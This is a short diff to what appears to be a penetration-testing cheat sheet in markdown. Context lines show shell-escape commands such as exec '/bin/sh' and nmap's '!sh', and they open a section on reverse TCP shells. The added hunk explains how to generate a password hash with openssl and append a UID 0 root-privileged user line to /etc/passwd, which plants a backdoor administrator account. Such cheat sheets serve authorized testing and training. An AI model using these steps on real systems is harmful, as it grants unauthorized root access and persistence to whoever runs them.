@@ -87,6 +87,15 @@ exec "/bin/sh"
 (From within nmap)
 !sh
 ```
+### [Adding a user with root privileges into /etc/passwd]
+```
+Generate your hash by using openssl
+openssl passwd -1 -salt [salt] [password]
+
+Adding your entry
+username:$1$new$hash:0:0:root:/root:/bin/bash
+```
+
 ## [reverse TCP Shell's]
 
 #### bash
